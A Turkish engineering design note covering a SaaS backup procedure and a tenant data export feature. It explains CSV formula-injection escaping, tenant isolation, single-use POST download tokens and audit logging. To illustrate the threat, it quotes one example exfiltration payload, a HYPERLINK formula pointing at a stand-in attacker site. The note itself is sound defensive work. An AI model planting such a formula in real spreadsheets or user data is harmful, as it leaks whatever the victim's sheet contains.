### Döküm pooler üzerinden alınmaz

`pg_dump` uzun süren tek bir oturum açar ve tutarlı bir snapshot için oturum durumuna güvenir;
PgBouncer transaction modunda bu bozulur ve döküm **hata vermeden tutarsız** çıkabilir.
`scripts/backup-dump.sh` adreste `-pooler` görürse **çalışmayı reddeder**. Aynı gerekçe
migration'lar için de geçerlidir (bkz. "Veritabanı bağlantı yönetimi (Issue #187)").

### Sessiz yedeksizliğe karşı

Bir yedekleme işinin en tehlikeli hâli, **başarılı görünüp işe yaramaz bir dosya üretmesidir**.
Script bu yüzden yüklemeden önce dökümü doğrular: `pg_restore --list` ile okunabilirlik, kayıt
sayısı eşiği ve dökümde **`_prisma_migrations` tablosunun varlığı**. Sonuncusu olmadan geri
dönüş, migration durumu bilinmeyen bir veritabanı üretir.

### Prova yapıldı — 2026-09-03

"Test edilmemiş bir yedek, yedek değildir." Prosedür varsayılmadı, koşuldu: 31 MB'lık kaynaktan
`pg_dump -Fc` (**518 ms**) → **boş** hedef veritabanı → `pg_restore` (**639 ms**) → doğrulama.

Altı tablonun kayıt sayısı, 13 tablonun tamamı, **15 uygulanmış migration** ve son migration adı
kaynakla **birebir** eşleşti; yarım kalmış migration yok. Ayrıntılar ve **dürüst sınırlar**
(Neon'a karşı değil lokal Postgres 16'ya karşı, 31 MB production ölçeği değil, PITR provası
yapılmadı): `docs/runbook-restore.md` § 7.

### Geri dönüşten sonra: `AUTH_SECRET`

Geri dönüş oturumları geçersiz kılmaz — `credentialsChangedAt` ve `sessionsRevokedAt` alanları
da geri sarılır. Yani **geri alınmış bir şifre değişikliği, eski oturumu yeniden geçerli kılar**.
Olay bir güvenlik ihlaliyse `AUTH_SECRET` döndürülmelidir; runbook § 8 bunu adım olarak taşır.

### Kalan risk / benden bağımsız yapılamayanlar

Bu bölüm hedef durumu tarif eder. Aşağıdakiler **hesap erişimi** gerektirdiği için yapılmadı ve
**#185 bunlar tamamlanmadan kapatılmamalıdır**:

- Neon'da otomatik yedekleme + **PITR'ın açılması** ve saklama süresinin belgelenmesi.
- Nesne deposu bucket'ı, şifreleme, **yalnızca yazma** yetkili anahtar.
- Haftalık işin **zamanlanması** ve son üç dökümün varlığının doğrulanması.
- Provanın **Neon'a karşı** tekrarlanması.
- `scripts/backup-dump.sh`'in S3 yükleme adımı **gerçek bir depoya karşı çalıştırılmadı**;
  döküm alma, doğrulama ve rotasyon mantığı taklit bir `aws` CLI ile uçtan uca koşturuldu.
- **"Hesabımı sil" akışı yok** — saklama tablosundaki "hesap silinene kadar" satırları bugün
  fiilen *süresiz* demektir. Ayrı bir issue gerekir.

## Tenant verisini dışa aktarma (Issue #194)

"Verim bende kalır mı?" satış görüşmesinde sorulan bir sorudur; KVKK kapsamında veri
taşınabilirliği ise bir haktır. Bugüne kadar bir tenant'ın verisini dışarı almanın hiçbir
yolu yoktu.

### Bağımlılık eklenmedi: CSV ve ZIP elle yazıldı

CSV'nin zor kısmı alıntılama değil, aşağıdaki **formül enjeksiyonu** korumasıdır — ve bu bir
CSV kütüphanesinin sorumluluğu değildir, çoğu yapmaz. ZIP'in ihtiyacımız olan kısmı ise
küçüktür: yerel başlık + deflate + merkezî dizin; sıkıştırma zaten Node'da (`zlib`).

**ZIP yazıcı gerçek araçlara karşı doğrulandı**, kendi okuyucumuza karşı değil: .NET
`ZipFile` ve Windows `Expand-Archive` ile açıldı. Bu, geliştirme sırasında gerçek bir hatayı
yakaladı — merkezî dizin girdilerinde **dosya adı yazılmıyordu** ve arşiv her araca **boş**
görünüyordu. Kendi yazdığımız okuyucuyla test etseydik bu hata geçerdi.

Bilinen sınırlar: **ZIP64 yok** (4 GB / 65535 dosya üstü), şifreleme yok. Sınırlar aşılırsa
sessizce bozuk dosya üretmek yerine **fırlatılır**.

### CSV formül enjeksiyonu

`=`, `+`, `-`, `@` (ve sekme/satır başı) ile başlayan hücreleri Excel **formül** olarak
çalıştırır. Kullanıcı bir kategoriye `=HYPERLINK("http://kotu.site?d="&A1,"Tıkla")` adını
verirse, dosyayı açan kişi tıkladığında tablodaki veri saldırgana gider.

**Bu bizim sorumluluğumuzdur**: dosyayı biz üretiyoruz ve bizim kullanıcımız açıyor.
"Excel'in sorunu" demek, kendi ürettiğimiz dosyayı silah yapmak olurdu.

Kaçırma **tek tırnakla** yapılır, silmeyle değil: Excel baştaki `'` karakterini "metin olarak ele
al" direktifi sayar ve göstermez. Karakteri silmek veriyi bozardı — eksi işaretiyle başlayan
meşru bir açıklama ("-500 düzeltmesi") sessizce değişirdi. Kaçırma **alıntılamadan önce**
yapılır; tersi, eklenen tırnağı alıntının dışında bırakıp ayrıştırmayı bozardı.

### Para STRING olarak yazılır

`Decimal` → `Number` çevrimi kayan nokta yuvarlamasıdır (invariant #10). Ama asıl tehlike
Excel'dedir: `1234.5600` hücresini sayıya çevirip sondaki sıfırları atar, büyük değerleri
bilimsel gösterime kaydırır ve 15 basamaktan sonra **hassasiyet kaybeder**. Metin olarak
yazılan değer, aktarıldığı andaki tam değeri taşır.

Dosyalar **BOM'lu UTF-8** ve **CRLF**'tir: BOM olmadan Excel dosyayı sistem kod sayfasıyla
açar ve Türkçe karakterler bozulur ("Kırtasiye" → "KÄ±rtasiye"). Standart ayrıştırıcılar
BOM'u yok sayar, yani "hem Excel'de açılır hem makine okur" şartının ikisi de sağlanır.

### Tenant izolasyonu: en kritik nokta

`src/lib/export/tenant-data.ts` içindeki **her** sorgu `tenantScoped()` üzerinden geçer
(invariant #1). Bir dışa aktarma dosyasına sızan tek bir yabancı satır, en kötü sınıftan bir
ihlaldir: kalıcı bir dosyaya yazılır, kullanıcıya teslim edilir ve **geri alınamaz**.

Testi bir **kontrol grubu** taşır: başka tenant'ın kimlikleri dosyada yok, ama kendi verisi
**var** — aksi halde "boş dosya" da testi geçerdi.

### Hangi alanlar dışarı çıkmaz

Üye satırında e-posta, ad, rol ve katılma zamanı **vardır** (tenant'ın verisidir).
`passwordHash`, `credentialsChangedAt`, `sessionsRevokedAt`, `emailVerified` **yoktur**: ilki bir
sırdır, diğerleri kullanıcının GÜVENLİK durumudur ve tenant'ın verisi değildir — bir tenant
sahibinin, üyesinin şifresini ne zaman değiştirdiğini öğrenmesi için hiçbir gerekçe yoktur.
Davetlerde `tokenHash` de yoktur.

Bunlar `include` ile değil **dar `select`** ile sağlanır: `include: { user: true }` yazmak,
şemaya eklenecek her yeni kullanıcı alanını sessizce dosyaya taşırdı.

### Üretim eşzamanlı değildir

Büyük bir tenant'ta ZIP üretimi HTTP zaman aşımını aşar. İstek `PENDING` bir kayıt bırakır ve
`202` döner; üretimi `POST /api/maintenance/data-exports` yapar — **#188'in getirdiği
"platform cron'u bir bakım ucunu çağırır" deseninin aynısı**. Bu repo'da kuyruk altyapısı
yoktur ve bir tane getirmek bu issue'nun kapsamı dışıdır.

İş **atomik olarak sahiplenilir** (`PENDING → PROCESSING` koşullu `updateMany`): eşzamanlı iki
bakım çağrısında aynı işi yalnızca biri alır. Dosya önce `.tmp`, sonra `rename` ile yazılır —
yarıda kesilen bir iş, "hazır" sanılıp indirilebilecek yarım bir ZIP bırakmamalıdır.

Aynı tenant için aynı anda **birden fazla bekleyen talep olamaz** (`409`): arka arkaya basılan
bir düğme, aynı veriyi üreten onlarca iş ve onlarca kalıcı dosya bırakırdı.

### 🔴 İndirme bir POST'tur — invariant gerilimi burada çözüldü

Issue iki şey istiyordu: indirme bağlantısı **tek kullanımlık** olsun ve invariant #6'nın
token desenine uysun. Ama tek kullanımlık olmak `downloadedAt`'i yazmak, yani bir **yan etki**
demektir. Bunu bir GET'e koymak **invariant #4'ü** ("GET/HEAD yan etkisizdir") ihlal ederdi ve
`integration/get-side-effect-free-pattern.spec.ts` haklı olarak kırmızıya dönerdi.

**İnvariant gevşetilmedi; biçim değiştirildi.** İndirme `POST /api/exports/download`'dur.
Kaybedilen tek şey adres çubuğuna yapıştırılabilen bir bağlantıdır; kazanılan şey hem tek
kullanımlılık hem de yan etkisiz GET kuralının bozulmamasıdır.

**Token gövdededir, URL'de değil:** URL'ler sunucu erişim loglarına, proxy loglarına ve
tarayıcı geçmişine yazılır. Tenant'ın tüm verisini açan bir anahtarın oralarda durmaması
gerekir.

Uç **kimlik istemez** — token'ın kendisi yetkidir (şifre sıfırlama linkiyle aynı model);
talebi yapan OWNER dosyayı başka bir cihazda açabilmelidir.

"Bulunamadı" / "süresi doldu" / "zaten indirildi" **ayrıştırılmaz**, hepsi `404` (invariant #7).
`409` yalnızca henüz hazır olmayan iş içindir ve bu bir sızıntı değildir: o token'ı yalnızca
talebi yapan bilir ve "hazır mı" sorusunun cevabını görmesi akışın kendisidir.

### Yetki OWNER-only

Yeni izin `tenant:export`, `modules:manage` ve `tenant:update-settings` ile **aynı sınıfta**:
dışa aktarma tenant'ın tüm verisini — üye e-postaları ve audit log dahil — tek bir dosyada
dışarı çıkarır. Bir ADMIN'in günlük operasyon yetkisi bunu kapsamaz; bu bir **sahiplik**
kararıdır.

Rate limit `tenant:data-export` **2/saat**: üretim pahalıdır ve her çalışma kalıcı bir dosya
bırakır. Sınırsız bırakmak, çalınmış bir OWNER oturumuyla diski doldurmanın ve aynı veriyi
tekrar tekrar dışarı taşımanın yolu olurdu.

### Audit: `TENANT_DATA_EXPORTED`

Olay **indirme anında** yazılır, talep anında değil — veri asıl orada dışarı çıkar.
"Veri sızdı mı, ne zaman, kim tarafından" sorusunun cevabı budur.

Süresi dolan dosyalar silinir ama **kayıt korunur**: dosya diskte durmamalıdır, ama "ne zaman,
kim tarafından dışa aktarıldı" bir audit sorusudur.

### Kalan risk / kapsam dışı

- **Arayüz yok.** Issue'nun kapsam listesinde UI maddesi yoktu; akış bugün yalnızca API
  üzerinden kullanılabilir.
- **Dosyalar YEREL DİSKTE.** `TENANT_EXPORT_DIR` ile yer değiştirilebilir, ama nesne deposuna
  taşımak **#185**'in konusudur ve o hesap erişimi bekliyor. Bu dizin web sunucusu tarafından
  **servis edilmemelidir**.
- **Zamanlanmış iş kurulmadı** — `MAINTENANCE_SECRET`'ın ortama konmasını ve bir cron
  tanımlanmasını gerektirir (#188 ile aynı durum).
- **İçe aktarma yok** (Epic 10, #79). `manifest.json` `formatVersion` taşıyor ki o iş bu
  biçimi okuyabilsin.
- **Modül verisi genel değil:** bugün açık modüllerin kendi tabloları yok; `moduller.csv` hangi
  modülün açık olduğunu taşır. CRM/Tahsilat modelleri geldiğinde bu dosya listesi genişletilmeli.
- **Büyük tenant ölçülmedi:** ZIP tek seferde bellekte üretilir. Bugünkü veri boyutlarında
  sorun değil, ama gigabaytlık bir tenant için akış (streaming) üretim gerekir.
